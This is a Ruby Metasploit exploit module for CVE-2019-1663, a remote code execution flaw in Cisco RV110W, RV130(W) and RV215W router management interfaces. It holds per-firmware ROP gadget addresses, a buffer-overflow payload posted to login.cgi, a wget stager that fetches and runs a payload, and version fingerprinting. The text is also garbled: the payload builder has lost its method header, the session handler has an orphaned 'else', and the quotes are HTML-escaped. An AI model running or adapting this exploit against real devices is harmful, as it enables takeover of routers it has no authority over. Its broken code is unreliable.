# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# linux/armle/shell/bind_tcp -> segfault
# linux/armle/shell/reverse_tcp -> segfault
# linux/armle/shell_bind_tcp -> segfault
# linux/armle/shell_reverse_tcp -> segfault
#
class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  moved_from &#039;exploit/linux/http/cisco_rv130_rmi_rce&#039;

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Cisco RV110W/RV130(W)/RV215W Routers Management Interface Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall,
        Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router
        could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device.

        The vulnerability is due to improper validation of user-supplied data in the web-based management interface.
        An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device.

        A successful exploit could allow the attacker to execute arbitrary code on the underlying operating
        system of the affected device as a high-privilege user.

        RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected.
        RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected.
        RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected.

        Note: successful exploitation may not result in a session, and as such,
         on_new_session will never repair the HTTP server, leading to a denial-of-service condition.
      },
      &#039;Author&#039;         =>
        [
          &#039;Yu Zhang&#039;, # Initial discovery (GeekPwn conference)
          &#039;Haoliang Lu&#039;, # Initial discovery (GeekPwn conference)
          &#039;T. Shiomitsu&#039;, # Initial discovery (Pen Test Partners)
          &#039;Quentin Kaiser <kaiserquentin@gmail.com>&#039; # Vulnerability analysis & exploit dev
        ],
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        =>  %w[linux],
      &#039;Arch&#039;            =>  [ARCH_ARMLE, ARCH_MIPSLE],
      &#039;CmdStagerFlavor&#039; => %w{ wget },
      &#039;Privileged&#039;      => true, # BusyBox
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2019-1663&#039;],
          [&#039;BID&#039;, &#039;107185&#039;],
          [&#039;URL&#039;, &#039;https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-cmd-ex&#039;],
          [&#039;URL&#039;, &#039;https://www.pentestpartners.com/security-blog/cisco-rv130-its-2019-but-yet-strcpy/&#039;]
        ],
      &#039;DefaultOptions&#039; => {
          &#039;WfsDelay&#039; => 10,
          &#039;SSL&#039; => true,
          &#039;RPORT&#039; => 443,
          &#039;CMDSTAGER::FLAVOR&#039; => &#039;wget&#039;,
       },
      &#039;Targets&#039;        =>
        [
          [ &#039;Cisco RV110W 1.1.0.9&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af06000,
              &#039;libcrypto_base_addr&#039; => 0x2ac01000,
              &#039;system_offset&#039;       => 0x00050d40,
              &#039;got_offset&#039;          => 0x0009d560,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x00167c8c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV110W 1.2.0.9&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af08000,
              &#039;libcrypto_base_addr&#039; => 0x2ac03000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x00167c4c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV110W 1.2.0.10&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af09000,
              &#039;libcrypto_base_addr&#039; => 0x2ac04000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV110W 1.2.1.4&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af54000,
              &#039;libcrypto_base_addr&#039; => 0x2ac4f000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV110W 1.2.1.7&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af98000,
              &#039;libcrypto_base_addr&#039; => 0x2ac4f000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV130/RV130W < 1.0.3.45&#039;,
            {
              &#039;offset&#039;          => 446,
              &#039;libc_base_addr&#039;  => 0x357fb000,
              &#039;system_offset&#039;   => 0x0004d144,
              &#039;gadget1&#039;         => 0x00020e79, # pop {r2, r6, pc};
              &#039;gadget2&#039;         => 0x00041308, # mov r0, sp; blx r2;
              &#039;Arch&#039;            => ARCH_ARMLE,
              &#039;DefaultOptions&#039;  => {
              }
            },
          ],
          [ &#039;Cisco RV215W 1.1.0.5&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af59000,
              &#039;libcrypto_base_addr&#039; => 0x2ac54000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV215W 1.1.0.6&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af59000,
              &#039;libcrypto_base_addr&#039; => 0x2ac54000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x00151fbc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV215W 1.2.0.14&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af5f000,
              &#039;libcrypto_base_addr&#039; => 0x2ac5a001,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV215W 1.2.0.15&#039;,
            {
              &#039;offset&#039;              => 69,
              &#039;libc_base_addr&#039;      => 0x2af5f000,
              &#039;libcrypto_base_addr&#039; => 0x2ac5a000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x00098db0,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x0005059c, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV215W 1.3.0.7&#039;,
            {
              &#039;offset&#039;              => 77,
              &#039;libc_base_addr&#039;      => 0x2afeb000,
              &#039;libcrypto_base_addr&#039; => 0x2aca5000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x000a0530,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x00057bec, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
          [ &#039;Cisco RV215W 1.3.0.8&#039;,
            {
              &#039;offset&#039;              => 77,
              &#039;libc_base_addr&#039;      => 0x2afee000,
              &#039;libcrypto_base_addr&#039; => 0x2aca5000,
              &#039;system_offset&#039;       => 0x0004c7e0,
              &#039;got_offset&#039;          => 0x000a0530,
              # gadget 1 is in /usr/lib/libcrypto.so
              &#039;gadget1&#039;             => 0x0003e7dc, # addiu $s0, $sp, 0x20; move $t9, $s4; jalr $t9; move $a0, $s0;
              &#039;Arch&#039;                => ARCH_MIPSLE,
              &#039;DefaultOptions&#039;  => {
              }
            }
          ],
        ],
      &#039;DisclosureDate&#039;  => &#039;Feb 27 2019&#039;,
      &#039;DefaultTarget&#039;   => 0,
      &#039;Notes&#039; => {
        &#039;Stability&#039;   => [ CRASH_SERVICE_DOWN, ],
      },
    ))
  end

  def p(lib, offset)
    [(lib + offset).to_s(16)].pack(&#039;H*&#039;).reverse
  end

    case target
    # RV110W 1.1.0.9, 1.2.0.9, 1.2.0.10, 1.2.1.4, 1.2.1.7
    # RV215W 1.1.0.5, 1.1.0.6, 1.2.0.14, 1.2.0.15, 1.3.0.7, 1.3.0.8
    when targets[0], targets[1], targets[2], targets[3], targets[4], targets[6], targets[7], targets[8], targets[9], targets[10], targets[11]
      shellcode = rand_text_alpha(target[&#039;offset&#039;]) +           # filler
        rand_text_alpha(4) +                                    # $s0
        rand_text_alpha(4) +                                    # $s1
        rand_text_alpha(4) +                                    # $s2
        rand_text_alpha(4) +                                    # $s3
        p(target[&#039;libc_base_addr&#039;], target[&#039;system_offset&#039;]) +  # $s4
        rand_text_alpha(4) +                                    # $s5
        rand_text_alpha(4) +                                    # $s6
        rand_text_alpha(4) +                                    # $s7
        rand_text_alpha(4) +                                    # $s8
        p(target[&#039;libcrypto_base_addr&#039;], target[&#039;gadget1&#039;]) +   # $ra
        p(target[&#039;libc_base_addr&#039;], target[&#039;got_offset&#039;]) +
        rand_text_alpha(28) +
        cmd
      shellcode
    when targets[5] # RV130/RV130W
      shellcode = rand_text_alpha(target[&#039;offset&#039;]) +           # filler
        p(target[&#039;libc_base_addr&#039;], target[&#039;gadget1&#039;]) +
        p(target[&#039;libc_base_addr&#039;], target[&#039;system_offset&#039;]) +  # r2
        rand_text_alpha(4) +                                    # r6
        p(target[&#039;libc_base_addr&#039;], target[&#039;gadget2&#039;]) +        # pc
        cmd
      shellcode
    end
  end

  def send_request(buffer)
    begin
      send_request_cgi({
        &#039;uri&#039;     => &#039;/login.cgi&#039;,
        &#039;method&#039;  => &#039;POST&#039;,
        &#039;vars_post&#039; => {
              "submit_button": "login",
              "submit_type": "",
              "gui_action": "",
              "wait_time": 0,
              "change_action": "",
              "enc": 1,
              "user": rand_text_alpha_lower(5),
              "pwd": buffer,
              "sel_lang": "EN"
          }
      })
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the router")
    end
  end

  def check

    # We fingerprint devices using SHA1 hash of a web resource accessible to unauthenticated users.
    # We use lang_pack/EN.js because it&#039;s the one file that changes the most between versions.
    # Note that it&#039;s not a smoking gun given that some branches keep the exact same files in /www
    # (see RV110 branch 1.2.1.x/1.2.2.x, RV130 > 1.0.3.22, RV215 1.2.0.x/1.3.x)

    fingerprints = {
      "69d906ddd59eb6755a7b9c4f46ea11cdaa47c706" => {
        "version" => "Cisco RV110W 1.1.0.9",
        "status" =>Exploit::CheckCode::Vulnerable
      },
      "8d3b677d870425198f7fae94d6cfe262551aa8bd" => {
        "version" => "Cisco RV110W 1.2.0.9",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "134ee643ec877641030211193a43cc5e93c96a06" => {
        "version" => "Cisco RV110W 1.2.0.10",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "e3b2ec9d099a3e3468f8437e5247723643ff830e" => {
        "version" => "Cisco RV110W 1.2.1.4, 1.2.1.7, 1.2.2.1 (not vulnerable), 1.2.2.4 (not vulnerable)",
        "status" => Exploit::CheckCode::Unknown
      },
      "6b7b1e8097e8dda26db27a09b8176b9c32b349b3" => {
        "version" => "Cisco RV130/RV130W 1.0.0.21",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "9b1a87b752d11c5ba97dd80d6bae415532615266" => {
        "version" => "Cisco RV130/RV130W 1.0.1.3",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "9b6399842ef69cf94409b65c4c61017c862b9d09" => {
        "version" => "Cisco RV130/RV130W 1.0.2.7",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "8680ec6df4f8937acd3505a4dd36d40cb02c2bd6" => {
        "version" => "Cisco RV130/RV130W 1.0.3.14, 1.0.3.16",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "8c8e05de96810a02344d96588c09b21c491ede2d" => {
        "version" => "Cisco RV130/RV130W 1.0.3.22, 1.0.3.28, 1.0.3.44, 1.0.3.45 (not vulnerable), 1.0.3.51 (not vulnerable)",
        "status" => Exploit::CheckCode::Unknown
      },
      "2f29a0dfa78063d643eb17388e27d3f804ff6765" => {
        "version" => "Cisco RV215W 1.1.0.5",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "e5cc84d7c9c2d840af85d5f25cee33baffe3ca6f" => {
        "version" => "Cisco RV215W 1.1.0.6",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "7cc8fcce5949a68c31641c38255e7f6ed31ff4db" => {
        "version" => "Cisco RV215W 1.2.0.14 or 1.2.0.15",
        "status" => Exploit::CheckCode::Vulnerable
      },
      "050d47ea944eaeadaec08945741e8e380f796741" => {
        "version" => "Cisco RV215W 1.3.0.7 or 1.3.0.8, 1.3.1.1 (not vulnerable), 1.3.1.4 (not vulnerable)",
        "status" => Exploit::CheckCode::Unknown
      }
    }

    uri = target_uri.path
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;lang_pack/EN.js&#039;)
    })
    if res && res.code == 200
      fingerprint = Digest::SHA1.hexdigest("#{res.body.to_s}")
      if fingerprints.key?(fingerprint)
        print_good("Successfully identified device: #{fingerprints[fingerprint]["version"]}")
        return fingerprints[fingerprint]["status"]
      else
        print_status("Couldn&#039;t reliably fingerprint the target.")
      end
    end
    Exploit::CheckCode::Unknown
  end

  def exploit
    print_status(&#039;Sending request&#039;)
    execute_cmdstager
  end

  def execute_command(cmd, opts = {})
    send_request(shellcode)
  end

  def on_new_session(session)
    # Given there is no process continuation here, the httpd server will stop
    # functioning properly and we need to take care of proper restart
    # ourselves.
    print_status("Reloading httpd service")
    reload_httpd_service = "killall httpd && cd /www && httpd && httpd -S"
      session.core.use &#039;stdapi&#039; unless session.ext.aliases.include? &#039;stdapi&#039;
      session.sys.process.execute &#039;/bin/sh&#039;, "-c \"#{reload_httpd_service}\""
    else
      session.shell_command(reload_httpd_service)
    end
  ensure
    super
  end
end

